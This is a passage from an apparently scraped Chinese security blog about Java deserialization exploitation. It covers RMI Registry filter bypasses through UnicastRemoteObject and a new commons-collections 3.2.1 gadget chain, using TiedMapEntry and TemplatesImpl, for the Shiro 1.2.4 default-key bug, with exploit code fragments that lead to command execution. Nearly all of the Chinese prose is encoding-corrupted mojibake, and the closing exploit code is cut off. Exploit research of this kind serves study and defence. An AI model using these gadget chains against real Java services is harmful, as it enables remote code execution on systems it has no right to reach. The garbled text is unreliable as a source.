ÊâÄ‰ª•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÁöÑÊñπÊ°àÂ∞±ÊòØÂ∞ÜËøô‰∏™enableReplaceÁªôÁΩÆ‰∏∫falseÔºåËøôÈáåÂÆûÁé∞Ëµ∑Êù•Â∞±ÊØîËæÉÁÆÄÂçï‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÂØπoutputstreamÂÅöÂèçÂ∞ÑË∞ÉÁî®ÔºåÊõøÊç¢true‰∏∫falseÔºåÂÖ∑‰ΩìÂÆûÁé∞ËßÅL34 ËøôÈáåÈúÄË¶ÅÊèê‰∏ÄÁÇπÁöÑÊòØËøôÊù°ÈìæÂ∑ßÂ¶ô‰πãÂ§ÑÂú®‰∫é UnicastRemoteObjectÂà©Áî®ÈìæÁî®Âà∞ÁöÑÂØπË±°ÈÉΩÊòØÂú®RegistryÂèØÂèçÂ∫èÂàóÂåñÁöÑÁôΩÂêçÂçïÈáåÁöÑ Ë∑üÂâçÈù¢Âá†‰∏™Â∞ÅË£ÖunicastrefÁöÑÊÄùË∑Ø‰∏çÂêåÔºåUnicastRemoteObjectÂÆûÈôÖ‰∏äÊòØ‰∏ªÂä®ÂêëÂ§ñÂèëÂá∫jrmpËøûÊé•ÁöÑÊñπÂºèÔºåËÄå‰∏çÊòØÂâçÈù¢ÈÄöËøáincomingtableË°®ÁöÑÊñπÂºèÂéªËß¶ÂèëjrmpËøûÊé• ‰∏∫‰ªÄ‰πàËØ¥‰ªñÂ∑ßÂ¶ôÂë¢ÔºüÂú®&gt;=8u232_b09ÁâàÊú¨Â≠òÂú®‰∏§‰∏™ÈôêÂà∂ÔºàÂÖ∑‰ΩìËßÅ0x04Ôºâ Ê∂àÈô§‰∫ÜÂ∞ÅË£ÖunicastRefÁöÑÂ®ÅËÉÅ Âú®DGCÂ±ÇÊ∑ªÂä†‰∫ÜÁôΩÂêçÂçïÁöÑÊñπÂºèÔºåÂØºËá¥Â∞±ÁÆójrmpËÉΩÂèçÈìæ‰πü‰∏çËÉΩÂèçÂ∫èÂàóÂåñÂá∫ÁôΩÂêçÂçï‰πãÂ§ñÁöÑÁ±ª ËÄåUnicastRemoteObjectÁªïËøá‰∫Ü‰∏äÈù¢ÁöÑ‰∏§‰∏™ÈôêÂà∂ È¶ñÂÖàÂØπ‰∫éÁ¨¨‰∏Ä‰∏™ÈôêÂà∂ÔºåUnicastRemoteObjectÁöÑjrmpÂèçËøûÂèëÁîüÂú®readObjectËøáÁ®ã‰∏≠ ÂÖ∂Ê¨°ÂØπ‰∫éÁ¨¨‰∫å‰∏™ÈôêÂà∂ÔºåÂâçÈù¢ÊèêÂà∞RegistryËÉΩËß¶ÂèëJRMPÂèçËøû‰∏ªË¶ÅÊòØÂõ†‰∏∫Ë∞ÉÁî®‰∫ÜDGCClient.registerRefsÂéªÂ§ÑÁêÜ ËÄåËøáËøô‰∏™ÁÇπÂ∞±ÈúÄË¶ÅÂèóÂà∞ÂâçÈù¢ÊèêÂà∞ÁöÑDGCÁôΩÂêçÂçïÁöÑÈóÆÈ¢ò„ÄÇÊÄé‰πàÁªïËøáËøô‰∏™Âú∞ÊñπÔºüÁÆÄÂçïÁöÑÂ∞±ÊòØÊâæ‰∏Ä‰∏™‰∏çÁªèËøáDGCClientÊù•Ëß¶ÂèëÂç≥ÂèØ„ÄÇ ÂâçÈù¢ÂàÜÊûê&lt;8u232_b09Êó∂ÔºåÁî®Âà∞ÁöÑRemoteObjectInvocationHandlerÁöÑÊñπÂºèÊù•Ëß¶ÂèëÔºå‰∏çËøáËøôÈáåÂÖ∂ÂÆûÂè™Áî®Âà∞‰∫ÜÂ∞ÅË£ÖUnicastRefÁöÑ‰ΩúÁî®ÔºàËøôÈáåÊèê‰∏Ä‰∏ãÂÆûÈôÖËß¶ÂèëÊó∂ÈúÄË¶ÅË∞ÉÁî®UnicastRef.invokeÔºâ„ÄÇUnicastRemoteObjectÂØπËøô‰∏™handlerÂÅö‰∫ÜÊõ¥Ê∑±ÂÖ•ÁöÑÂà©Áî®ÔºåËøôÈáåÁî®Âà∞‰∫Üjava.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod Ë∞ÉÁî®‰∫Üref.invokeËß¶ÂèëjrmpÂèçËøûÔºåÂà∞ËøôÈáåÈÉΩÊ≤°ÊúâÁªèËøáDGCClientÁöÑË∑ØÂæÑÔºåËá™ÁÑ∂‰πüÂ∞±Ê≤°ÊúâÁôΩÂêçÂçïÁöÑÈôêÂà∂„ÄÇ ‰∏çËøáËøôÊù°ÈìæÂà∞‰∫Ü8u242‰πüÂ§±Êïà‰∫ÜÔºå‰∏ªË¶ÅÂéüÂõ†Âú®‰∫élookupÊé•Âè£Êó†Ê≥ïÂÜçÂèçÂ∫èÂàóÂåñÈùûstringÁ±ªÂûãÁöÑobject‰∫Ü 0x08 RMI DGCÂÆûÁé∞ÈóÆÈ¢ò(ysoserial.expliots.JRMPClient)Âú®JEP290‰πãÂâçÔºåRMIÁöÑDGCImpl_skel#dipatchÊé•Êî∂Â§ÑÔºåËé∑ÂèñÂà∞Êï∞ÊçÆÂêéÔºåÁõ¥Êé•readObjectÈÄ†ÊàêÁöÑ„ÄÇ Âú®JEP290‰πãÂêéÔºåÂèçÂ∫èÂàóÂåñÂâçÂÅö‰∫ÜÊ†°È™åÔºåËßÅDGCImpl ÂØºËá¥‰∫ÜysoserialÁöÑexploit‰∏≠ÁöÑJRMPClientÂ§±Êïà 0x09 ÊÄªÁªì‰∏≠Á¨¨‰∫åÁßçÊñπÂºèÁöÑËß¶ÂèëÁÇπÔºà20200317 Êõ¥Êñ∞ÔºâÂâçÈù¢ÊÄªÁªì‰∏≠ÊèêÂà∞ÁöÑÁ¨¨‰∫å‰∏≠ÊñπÂºèÔºöÈÄöËøáÂØªÊâæÂèØ‰ª•Âà©Áî®ÁöÑÁªëÂÆöÂØπË±°ÁöÑÂáΩÊï∞ÁöÑÂèÇÊï∞ËøõË°åÂèçÂ∫èÂàóÂåñÂà©Áî® Áõ¥Êé•ËÆ≤Ëß¶ÂèëÁÇπsun/rmi/server/UnicastServerRef.java#dispatch#338 ÂΩìÊàë‰ª¨ÁºñÂÜôClientÁ´ØÂØπServerÁ´ØÊåÇËΩΩÁöÑÂØπË±°ËøõË°åËøúÁ®ãÂáΩÊï∞Ë∞ÉÁî®ÔºàRMIÔºâÊó∂ÔºåServerÁ´Ø‰ºöÈÄê‰∏ÄËøõË°åÔºàËé∑ÂèñÂà∞MethtodÔºåËß£ÊûêparametersÔºåÊúÄÂêéËøõË°åinvokeË∞ÉÁî®Ôºâ„ÄÇËÄåÂú®Ëß£ÊûêparamsÊó∂ÔºàÊàë‰ª¨ËÆ≤ËøáRMIËøáÁ®ã‰∏≠ÔºåÂØπË±°ÂùáÊòØÂ∫èÂàóÂåñÁöÑÁä∂ÊÄÅÔºâÊàë‰ª¨ÈúÄË¶ÅÂÖàÂØπÂèÇÊï∞ÂØπË±°ËøõË°åÂèçÂ∫èÂàóÂåñÔºå‰πüÂ∞±ÊòØÁ¨¨338Ë°åÊâÄÂÅöÁöÑÂ∑•‰ΩúÔºåÁªßÁª≠ÂæÄ‰∏ãË∑ü Âú®ÂáΩÊï∞unmarshalParametersUnchecked‰∏≠ÂàÜÂà´ÂØπÊØè‰∏™ÂèÇÊï∞ËøõË°åÂèçÂ∫èÂàóÂåñËøòÂéü Â¶ÇÊûúÊâÄÊé•ÂèóÁöÑÁ±ªÂûãÈùûÂü∫Á°ÄÊï∞ÊçÆÁªìÊûÑÔºåÈÇ£‰πàÂ∞ÜÁõ¥Êé•Ë∞ÉÁî®readObjectÔºåËøôÈÉ®ÂàÜÂπ∂Ê≤°ÊúâÂâçÈù¢filterÁöÑÈôêÂà∂ ÊâÄ‰ª•Â¶ÇÊûúÊâæÂà∞‰∫Ü‰∏Ä‰∏™ServerÁ´ØÊåÇËΩΩÁöÑÂØπË±°Â≠òÂú®ÂáΩÊï∞ÂèÇÊï∞Á±ªÂûã‰∏∫Object„ÄÅHashTableÁ≠âÁ±ªÂûãÊó∂ÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Á©øÂÖ•ÊûÑÈÄ†Â•ΩÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ„ÄÇÂΩìÂâçÂâçÊèêËøòÊòØServerÁ´ØÁöÑÁéØÂ¢É‰∏≠Â≠òÂú®Áõ∏Â∫îÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑ‰æùËµñ„ÄÇ"},{"title":"„Äênotes„ÄëJavaÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò‰πãShiroÂèçÂ∫èÂàóÂåñ","permalink":"http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/","text":"0x00 ÂâçË®ÄÂú®Ë∑ü‰∫Ü‰∏ÄÈÅçcommons-collectionsÁ≥ªÂàóÁöÑpayloadÂêéÔºåÁªà‰∫éÂèØ‰ª•ÂºÄÂßãËß£ÂÜ≥‰∏Ä‰∏ãÂΩìÊó∂ÂØπshiroÂèçÂ∫èÂàóÂåñÊ®°Âáå‰∏§ÂèØÁöÑËÆ§ËØÜ‰∫Ü„ÄÇ ÂΩìÂâçÔºå‰∏çÁÆ°ÊòØÂõΩÂÜÖÂÆûÈôÖÁöÑxxË°åÂä®ËøòÊòØctfÊØîËµõÔºåshiroÂèçÂ∫èÂàóÂåñ‰ºöÁªèÂ∏∏ÁúãÂà∞„ÄÇ‰ΩÜÂú®ÂÆûÈôÖÂà©Áî®Ëøô‰∏™ÊºèÊ¥ûÁöÑÊó∂ÂÄôÔºå‰ºöÂèëÁé∞Êàë‰ª¨Êó†Ê≥ïÂú®tomcat‰∏ãÁõ¥Êé•Âà©Áî®shiroÂéüÁîüÁöÑcommons-collections:3.2.1ÔºàÂéüÂõ†ÂêéÈù¢ËØ¥Ôºâ„ÄÇ Êàë‰ª¨ÂâçÈù¢Â∑≤ÁªèÂØπcommons-collectionsÁ≥ªÂàóÂà©Áî®ÈìæÁöÑÂàÜÊûêÔºå‰ªäÂ§©Â∞±Êù•Ê†πÊçÆÂ≠¶Âà∞ÁöÑÁü•ËØÜÊù•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ Êú¨ÊñáËÆ®ËÆ∫‰∫Üshiro-1.2.4ÁâàÊú¨Êó†Ê≥ïÁõ¥Êé•Âà©Áî®Áé∞ÊúâÁöÑysoserialÂà©Áî®ÈìæÔºåÂπ∂ÊèêÂá∫‰∫ÜÁõ∏Â∫îÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ 0x01 ÁéØÂ¢ÉÂáÜÂ§áËøôÈáåÁî®ÁöÑÊòØshiro-root-1.2.4ÁöÑsamples/webÁéØÂ¢ÉÔºåclone‰∏ãÊù•ÂêéÊâßË°ågit checkout shiro-root-1.2.4 Âà©Áî®ËÑöÊú¨ÂèÇËÄÉÁöÑÁü•ÈÅìÂàõÂÆáÁöÑ‰∏ÄÁØáÂàÜÊûê ysoserialÁî®ÁöÑ0.0.6ÁâàÊú¨https://github.com/frohoff/ysoserial ÂÖàÊù•ËÆ≤‰∏Ä‰∏ãÔºåÂÖ≥‰∫éÁéØÂ¢ÉÊñπÈù¢ÈÅáÂà∞ÁöÑÂùëÔºö Âú®ÈÉ®ÁΩ≤ËøáÁ®ã‰∏≠ÔºåÈÅáÂà∞‰∫ÜThe absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this applicationÁöÑÈîôËØØ ËøôÈáåÁöÑËß£ÂÜ≥ÊñπÊ°àÊòØ‰øÆÊîπpom.xml ‚Äã Ê∑ªÂä†jstlÁöÑÂÖ∑‰ΩìÁâàÊú¨Âç≥ÂèØËß£ÂÜ≥„ÄÇ serialVersionUID‰∏ç‰∏ÄËá¥ÂØºËá¥Êó†Ê≥ïÂèçÂ∫èÂàóÂåñÁöÑÈóÆÈ¢ò ËøôÈáåÂèØËÉΩÂú®‰Ω†ÁöÑÂÆûÈ™åÁéØÂ¢É‰∏ã‰∏ç‰∏ÄÂÆö‰ºöÈÅáÂà∞ÔºåÊàëÁöÑÂÆûÈ™åÁéØÂ¢ÉÂíåysoserialÁîüÊàêÁöÑÊüêÂá†‰∏™Á±ªÁöÑserialVersionUID‰∏ç‰∏ÄËá¥ÔºåÂØºËá¥Êó†Ê≥ïÊ≠£Â∏∏ÂèçÂ∫èÂàóÂåñ„ÄÇÂú®ÂÆûÊàò‰∏≠‰Ω†ÂèØ‰ª•ÈááÁî®ËøôÁØáÊñáÁ´†Â§ÑÁêÜÊñπÊ≥ïÔºåËøôÈáåÊàëÁöÑËß£ÂÜ≥ÊñπÊ°àÊòØÁõ¥Êé•ÂêåÊ≠•‰∏™commons-collections:3.2.1ÁâàÊú¨ÔºåÂú®ÁîüÊàêwarÂåÖÂâçÔºåÂú®pom.xmlÂä†ÂÖ• 123456&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 0x02 ÂâçÊôØÂõûÈ°æ16Âπ¥ÁöÑÊó∂ÂÄôÔºåshiroÁàÜÂá∫‰∫Ü‰∏Ä‰∏™ÈªòËÆ§keyÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇËá≥‰ªäÂ∑≤ÊúâÂ§ßÈáèÁöÑÂàÜÊûêÊñáÁ´†ÂàÜÊûê‰∫ÜËØ•ÊºèÊ¥ûÁöÑÂéüÁêÜÔºåÊâÄ‰ª•Êú¨Êñá‰∏çÂÜçÈáçÂ§çÂàÜÊûêËØ•ÊºèÊ¥ûÁöÑÁõ∏ÂÖ≥ÂéüÁêÜÔºåÂèØ‰ª•ÂèÇËÄÉ‰ª•‰∏ãÂá†ÁØáÊñáÁ´†ÁöÑÂàÜÊûêÔºö 1.https://blog.knownsec.com/2016/08/apache-shiro-java/ 2.https://blog.zsxsoft.com/post/35 3.http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html Èô§‰∫Ü1‰∏≠Âú®ÊºèÊ¥ûÁéØÂ¢É‰∏ãÊ∑ªÂä†‰∫Ücommons-collections:4.0ÔºåÂè¶Â§ñ‰∏§ÁØáÊñáÁ´†ÂùáÊèêÂà∞‰∫ÜÂú®tomcat‰∏ãÊó†Ê≥ïÁõ¥Êé•Âà©Áî®commons-collections:3.2.1ÁöÑÈóÆÈ¢ò„ÄÇÊé•‰∏ãÊù•Êàë‰ª¨Â∞±Êù•ÁúãÁúãÊòØ‰ªÄ‰πàÂéüÂõ†ÂêßÔºöÔºâ org.apache.shiro.io.DefaultSerializer.deserialize:67 ËøôÈáåÊàë‰ª¨Áõ¥Êé•ÁúãÂèçÂ∫èÂàóÂåñÂèëÁîüÁöÑÁÇπÔºåÁ¨¨75Ë°å‰ΩøÁî®‰∫ÜClassResolvingObjectInputStreamÁ±ªËÄåÈùû‰º†ÁªüÁöÑObjectInputStream.ËøôÈáåÂèØËÉΩÊòØÂºÄÂèë‰∫∫ÂëòÂÅöÁöÑ‰∏ÄÁßçÈò≤Êä§Êé™ÊñΩÔºü‰ªñÈáçÂÜô‰∫ÜObjectInputStreamÁ±ªÁöÑresolveClassÂáΩÊï∞ÔºåÊàëÊõæÂú®Á¨¨‰∏ÄÁØáÂü∫Á°ÄÊñáÁ´†‰∏≠ÂàÜÊûêËøáJavaÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ãÔºåObjectInputStreamÁöÑresolveClassÂáΩÊï∞Áî®ÁöÑÊòØClass.forNameÁ±ªËé∑ÂèñÂΩìÂâçÊèèËø∞Âô®ÊâÄÊåá‰ª£ÁöÑÁ±ªÁöÑClassÂØπË±°„ÄÇËÄåÈáçÂÜôÂêéÁöÑresolveClassÂáΩÊï∞ ÈááÁî®ÁöÑÊòØClassUtils.forNameÔºåÊàë‰ª¨ÁªßÁª≠ÁúãËøô‰∏™forNameÁöÑÂÆûÁé∞„ÄÇ Êù•ÁúãÁúãËøô‰∏™ExceptionIgnoringAccessorÊòØÊÄé‰πàÂÆûÁé∞ÁöÑ ËøôÈáåÂÆûÈôÖ‰∏äË∞ÉÁî®‰∫ÜParallelWebAppClassLoaderÁà∂Á±ªWebappClassLoaderBaseÁöÑloadClassÂáΩÊï∞ÔºàÂèØ‰ª•Áõ¥Êé•‰∏ãÊñ≠ÁÇπÁúãÁúãÂÜÖÂÆπÔºâ„ÄÇ ËØ•loadClassËΩΩÂÖ•ÊåâÁÖß‰∏äËø∞ÁöÑÈ°∫Â∫èÔºàËøôÈáå‰∏çË¥¥‰ª£Á†Å‰∫ÜÔºåÊâæÂà∞org.apache.catalina.loader.WebappClassLoaderBase.loadClassÂç≥ÂèØÔºâÔºåÂÖà‰ªécache‰∏≠ÊâæÂ∑≤ËΩΩÂÖ•ÁöÑÁ±ªÔºåÂ¶ÇÊûúÂâç3ÁÇπÈÉΩÊ≤°ÊâæÂà∞ÔºåÂÜçÈÄöËøáÁà∂Á±ªURLClassLoaderÁöÑloadClassÂáΩÊï∞ËΩΩÂÖ•„ÄÇ‰ΩÜÊòØÂÆûÈôÖ‰∏äÊ≠§Êó∂loadClassÁöÑÂèÇÊï∞nameÂÄºÂ∏¶‰∏ä‰∫ÜÊï∞ÁªÑÁöÑÊ†áÂøóÔºåÂç≥/Lorg/apache/commons/collections/Transformer;.classÔºåÂú®ÂèÇËÄÉÁöÑÁ¨¨‰∫åÁØáÊñáÁ´†ÈáåÊúâÊèêÂà∞Ëøô‰∏™ÈóÆÈ¢òÔºåÊâÄ‰ª•ÂØºËá¥shiroÊó†Ê≥ïËΩΩÂÖ•Êï∞ÁªÑÁ±ªÂûãÁöÑÂØπË±°„ÄÇ ÈÇ£‰πàÂ¶Ç‰ΩïÊâçËÉΩÁúüÊ≠£ÁöÑÂà©Áî®commons-collections:3.2.1Êù•ÊûÑÈÄ†Âà©Áî®ÈìæÂë¢Ôºü È¶ñÂÖàÔºåÂú®ÂèÇËÄÉÁöÑÁ¨¨‰∏ÄÁØáÊñáÁ´†ÈáåÔºå‰ΩúËÄÖÂú®ÁéØÂ¢É‰∏≠ÂºïÂÖ•‰∫Ücommons-collections:4.0Ôºå‰ΩøÂæóysoserialÁöÑCommonsCollections2Âà©Áî®ÈìæÂèØ‰ª•ÊàêÂäüÂà©Áî®„ÄÇËøôÊòØÂõ†‰∏∫CommonsCollections2Áî®ÁöÑÊòØÈùûÊï∞ÁªÑÂΩ¢ÂºèÁöÑÂà©Áî®ÈìæÔºåÂú®ËØ•Âà©Áî®Èìæ‰∏äÊ≤°ÊúâÂá∫Áé∞Êï∞ÁªÑÁ±ªÂûãÁöÑÂØπË±°ÔºåËøô‰ΩøÂæóÂú®shiroÁöÑÁéØÂ¢É‰∏ãÔºåÂèØ‰ª•Ê≠£Á°ÆÊâßË°åÂëΩ‰ª§„ÄÇ ÈÇ£‰πàÔºåÈóÆÈ¢òÊù•‰∫ÜÔºåÊàë‰ª¨ÊòØÂê¶ËÉΩÊûÑÈÄ†Âá∫‰∏Ä‰∏™Âú®commons-collections:3.2.1‰∏ãÂèØ‰ª•Âà©Áî®ÔºåÂπ∂‰∏îÂú®Âà©Áî®Èìæ‰∏ä‰∏çÂ≠òÂú®Êï∞ÁªÑÁ±ªÂûãÁöÑÂØπË±°ÔºüÁ≠îÊ°àÂΩìÁÑ∂ÊòØËÇØÂÆöÁöÑÔºöÔºâ 0x03 Êñ∞Âà©Áî®ÈìæÊûÑÈÄ†Ê†πÊçÆ0x02ÁöÑ‰ªãÁªçÔºåÊàë‰ª¨ÂèØ‰ª•Ê∏ÖÊ•öÁöÑÊòØÂà©Áî®Èìæ‰∏≠ÁöÑChainedTransformerËøô‰∏™Á±ªÁöÑÂà©Áî®ÊòØÊó†Ê≥ïÊàêÂäüÁöÑÔºåÂõ†‰∏∫‰ªñÁöÑÁ±ªÂ±ûÊÄßiTransformersÊòØÊï∞ÁªÑÁ±ªÂûãÁöÑTransformersÔºå‰πüÂ∞±ÊòØÂú®ÊâßË°åËøáÁ®ã‰∏≠ÂèëÁîüÁöÑClassNotFoundException„ÄÇ Â¶ÇÊûú‰Ω†ÁúãËøáÂâçÂá†ÁØáÂÖ≥‰∫écommons-collectionsÁ≥ªÂàóÁöÑpayloadÂàÜÊûêÔºåÈÇ£‰πà‰Ω†ËÇØÂÆöÂèØ‰ª•ÂõûÂøÜËµ∑Êù•ÔºåÈô§‰∫ÜÂà©Áî®ChainedTransformerËøôÁßçÊñπÂºèÔºåËøòÂèØ‰ª•‰ΩøÁî®TemplatesImpl.newTransformerÂáΩÊï∞Êù•Âä®ÊÄÅloadClassÊûÑÈÄ†Â•ΩÁöÑevil class bytesÔºàËøô‰∏ÄÈÉ®ÂàÜ‰∏çÂ§çËø∞‰∫ÜÔºåÂèØ‰ª•ÁúãÂâçÈù¢ÁöÑÊñáÁ´†Ôºâ„ÄÇÂπ∂‰∏îÂú®ËøôÈÉ®ÂàÜÂà©Áî®Èìæ‰∏äÊòØ‰∏çÂ≠òÂú®Êï∞ÁªÑÁ±ªÂûãÁöÑÂØπË±°ÁöÑ„ÄÇ ÈÇ£‰πàÔºåÊé•‰∏ãÊù•ÁöÑÈáçÁÇπÂ∞±ÊòØÊâæ‰∏Ä‰∏™Â¶Ç‰ΩïËß¶ÂèëTemplatesImpl.newTransformerÁöÑÊñπÊ≥ï‰∫ÜÔºöÔºâ Êàë‰ª¨ÂÖàÊù•ÂõûÈ°æ‰∏Ä‰∏ãCommonsCollections2ÁöÑÂà©Áî®Èìæ 123456789PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() Âú®ËøôÊù°Èìæ‰∏äÔºåÁî±‰∫éTransformingComparatorÂú®3.2.1ÁöÑÁâàÊú¨‰∏äËøòÊ≤°ÊúâÂÆûÁé∞SerializableÊé•Âè£ÔºåÂÖ∂Âú®3.2.1ÁâàÊú¨‰∏ãÊòØÊó†Ê≥ïÂèçÂ∫èÂàóÂåñÁöÑ„ÄÇÊâÄ‰ª•Êàë‰ª¨Êó†Ê≥ïÁõ¥Êé•Âà©Áî®ËØ•payloadÊù•ËææÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑÁõÆÁöÑ„ÄÇ ÈÇ£‰πàÂ∞±Êù•ÊîπÈÄ†ÊîπÈÄ†ÂêßÔºÅÊàë‰ª¨ÂÖàÂ∞ÜÊ≥®ÊÑèÂäõÂÖ≥Ê≥®Âú®InvokerTransformer.transform()‰∏ä ËøôÈáåÊòØÊúÄÁªèÂÖ∏ÁöÑÂèçÂ∞ÑÊú∫Âà∂ÁöÑÂÜôÊ≥ïÔºåÊ†πÊçÆ‰º†ÂÖ•ÁöÑinputÂØπË±°ÔºåË∞ÉÁî®ÂÖ∂iMethodNameÔºàÂèØÊéßÔºâ„ÄÇÈÇ£‰πàÂ¶ÇÊûúÊ≠§Êó∂‰º†ÂÖ•ÁöÑinput‰∏∫ÊûÑÈÄ†Â•ΩÁöÑTemplatesImplÂØπË±°Âë¢Ôºü ÂæàÊòéÊòæÔºåËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÂ∞ÜiMethodNameÁΩÆ‰∏∫newTransformerÔºå‰ªéËÄåÂÆåÊàêÂêéÁª≠ÁöÑtemplates gadgets„ÄÇ ÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåÊÄé‰πàÂ∞Ü‰º†ÂÖ•ÁöÑinputÁΩÆ‰∏∫TemplatesImplÂØπË±°Âë¢Ôºü Âú®ysoserialÁöÑÂà©Áî®Èìæ‰∏≠ÔºåÂÖ≥‰∫étransformÂáΩÊï∞Êé•Êî∂ÁöÑinputÂ≠òÂú®‰∏§ÁßçÊÉÖÂÜµ„ÄÇ 1.ÈÖçÂêàChainedTransformerInvokerTransformerÂæÄÂæÄÂêåChainedTransformerÈÖçÂêàÔºåÂæ™ÁéØÊûÑÈÄ†Runtimt.getRuntime().exec„ÄÇÂæàÊòéÊòæÔºåËøôÈáåÊàë‰ª¨Êó†Ê≥ïÂà©Áî®‰∫Ü„ÄÇ 2.Êó†ÊÑè‰πâÁöÑStringËøôÈáåÁöÑÊó†ÊÑè‰πâÁöÑStringÊåáÁöÑÊòØ‰º†ÂÖ•Âà∞ConstantTransformer.transformÂáΩÊï∞ÁöÑinputÔºåËØ•transformÂáΩÊï∞‰∏ç‰æùËµñinputÔºåËÄåÁõ¥Êé•ËøîÂõûiConstant ËøôÈáåÁ¨¨‰∏ÄÊù°Ë∑ØËÇØÂÆöÊñ≠‰∫ÜÔºåÈÇ£‰πàÂ∞±ÊòØÊÄé‰πàÂà©Áî®Ëøô‰∏™Êó†ÊÑè‰πâÁöÑString‰∫ÜÔºÅ ‰ªéCommonsCollection5ÂºÄÂßãÔºåÂá∫Áé∞‰∫ÜTiedMapEntryÔºåÂÖ∂‰Ωú‰∏∫‰∏≠ÁªßÔºåË∞ÉÁî®‰∫ÜLazyMapÔºàmapÔºâÁöÑgetÂáΩÊï∞„ÄÇ Êù•Áúã‰∏ÄÁúã ÂÖ∂‰∏≠mapÂíåkeyÊàë‰ª¨ÈÉΩÂèØ‰ª•ÊéßÂà∂ÔºåËÄåLazyMap.getË∞ÉÁî®‰∫ÜtransformÂáΩÊï∞ÔºåÂπ∂Â∞ÜÂèØÊéßÁöÑkey‰º†ÂÖ•transformÂáΩÊï∞ ËøôÈáåÂ∞±Êé•‰∏ä‰∫ÜÊàë‰ª¨ÂâçÈù¢ËÆ®ËÆ∫ÁöÑÔºåÂ∞ÜÊûÑÈÄ†Â•ΩÁöÑTemplatesImplÔºàkeyÔºâ‰Ωú‰∏∫InvokerTransformer.transformÂáΩÊï∞ÁöÑinput‰º†ÂÖ•ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Â∞Ütemplates gadgets‰∏≤Ëµ∑Êù•‰∫Ü„ÄÇ ÁÆÄÂçïÊù•ËØ¥ÔºåÊàë‰ª¨Â∞ÜCommonsCollections5,6,9ÊûÑÈÄ†Èìæ‰∏≠ÁöÑTiedMapEntryÁöÑkeyÁî®‰∫ÜËµ∑Êù•„ÄÇ 123final Object templates = Gadgets.createTemplatesImpl(command);// TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); //ÂéüÊù•ÁöÑÂà©Áî®ÊñπÂºèTiedMapEntry entry = new TiedMapEntry(lazyMap, templates); ËøôÈáåÂ∞ÜÊó†ÊÑè‰πâÁöÑfooÊîπÈÄ†Êàê‰∫ÜËß¶ÂèëTemplatesImpl.newTransformerÁöÑtrigger„ÄÇ ËÄåÂú®TiedMapEntryÂâçÁöÑÂà©Áî®ÈìæÔºåÂú®ÂéüÁîüshiroÁéØÂ¢É‰∏ãÔºåÂπ∂‰∏çÂÜ≤Á™ÅÔºàÊ≤°ÊúâÊï∞ÁªÑÁ±ªÂûãÁöÑÂØπË±°ÔºâÔºåÂèØ‰ª•Ê≠£Â∏∏ÂèçÂ∫èÂàóÂåñ„ÄÇËøô‰∏ÄÈÉ®ÂàÜÂ∞±ÁúÅÁï•‰∫Ü„ÄÇ 20200108Ë°•ÂÖÖÂÖ∂ÂÆûcreateTemplatesImplÁöÑÂà©Áî®ÊñπÂºè‰∏≠ËøòÊòØÂ≠òÂú®Êï∞ÁªÑÂΩ¢ÂºèÁöÑÔºåbyte[]Êï∞ÁªÑÁî®‰∫éÂ≠òÂÇ®evil class„ÄÇ‰ΩÜÊòØÂú®tomcat 7Âèä‰ª•‰∏äÁöÑÁéØÂ¢É‰∏ãÔºåjavaÁöÑÂéüÁîüÊï∞ÊçÆÁ±ªÂûãÁöÑÊï∞ÁªÑËøòÂéü‰∏çÂΩ±ÂìçÂèçÂ∫èÂàóÂåñÔºåÂè™ÈíàÂØπÂØπË±°Á∫ßÂà´ÁöÑÊï∞ÁªÑËøòÂéü„ÄÇËÄåtomcat6ÁöÑÂÆûÁé∞ÊñπÂºèÁõ¥Êé•‰∏çÂÖÅËÆ∏Êï∞ÁªÑÁ±ªÂûãÁöÑËøòÂéüÔºå‰πüÂ∞±ÊòØËØ¥ËØ•Âà©Áî®ÈìæÂú®tomcat6ÁöÑÁéØÂ¢É‰∏ãÊòØÊàêÂäü‰∏ç‰∫ÜÁöÑ„ÄÇ 20200109Ë°•ÂÖÖÂΩìÂ∫îÁî®ÂºÄÂêØ‰∫Üsecurity managerÊó∂ÔºåÈúÄË¶ÅËÆæÁΩÆ-Djdk.xml.enableTemplatesImplDeserialization=true 0x04 EXPÁºñÂÜôËøôÈáåÂÖ∂ÂÆûÂèØ‰ª•ÊûÑÈÄ†Âá∫Â•ΩÂá†‰∏™ÈìæÔºåÊàëËøôÈáåÂ∞±ÊãøHashSet‰∏∫‰æãÔºåÂÆåÊï¥ÁöÑexpËßÅMyYsoserial‰∏≠ÁöÑCommonsCollections10 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849final Object templates = Gadgets.createTemplatesImpl(command);// ÊûÑÈÄ†Â∏¶Êúâevil class bytesÁöÑTemplatesImpl// ÊûÑÈÄ†InvokerTransformerÔºåÂ°´ÂÖÖÊó†ÂÆ≥ÁöÑtoStringÂáΩÊï∞final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new 